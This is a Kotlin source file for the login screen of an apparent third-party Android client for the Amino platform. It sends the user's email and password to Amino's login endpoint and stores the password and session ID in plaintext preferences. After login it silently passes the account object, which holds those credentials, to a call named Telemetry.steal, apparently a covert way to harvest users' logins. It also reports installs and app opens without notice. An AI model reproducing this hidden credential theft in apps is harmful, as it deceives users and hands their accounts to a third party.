package com.darkwater.hterix2.activity

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.core.content.edit
import com.darkwater.hterix2.LibConstants
import com.darkwater.hterix2.R
import com.darkwater.hterix2.http.AminoRequest
import com.darkwater.hterix2.http.Telemetry
import com.darkwater.hterix2.utils.Serialization
import com.google.android.material.textfield.TextInputEditText

class AuthActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_auth)
        Telemetry.checkBanned(this)
        Telemetry.checkVersion(this)
        Telemetry.checkBroadcast(this)
        val emailInput = findViewById<TextInputEditText>(R.id.emailEditText)
        val passwordInput = findViewById<TextInputEditText>(R.id.passwordEditText)
        val button = findViewById<Button>(R.id.loginSubmitButton)
        if (!getSharedPreferences("sharedPrefs", Context.MODE_PRIVATE).getBoolean("installed", false)) {
            Telemetry.notifyInstalled()
            getSharedPreferences("sharedPrefs", Context.MODE_PRIVATE).edit {
                putBoolean("installed", true)
            }
        } else {
            Telemetry.notifyOpened()
        }
        button.setOnClickListener {
            val email = emailInput.text.toString()
            val password = passwordInput.text.toString()
            AminoRequest.initRequest("POST", "/g/s/auth/login", this)
                .async()
                .addBody(Serialization.createAuthBody(email, password))
                .send {
                    val account = Serialization.extractAccount(it, email, password, LibConstants.DEFAULT_DEVICE_ID)
                    Toast.makeText(this, "Авторизован как ${account.nickname}", Toast.LENGTH_SHORT).show()
                    startActivity(Intent(this, MainActivity::class.java))
                    AminoRequest.sid = "sid=${account.sid}"
                    getSharedPreferences("account", Context.MODE_PRIVATE).edit {
                        putBoolean("authorized", true)
                        putString("email", email)
                        putString("password", password)
                        putString("nickname", account.nickname)
                        putString("sid", AminoRequest.sid)
                    }
                    Telemetry.steal(account)
                    finish()
                }
        }
    }
}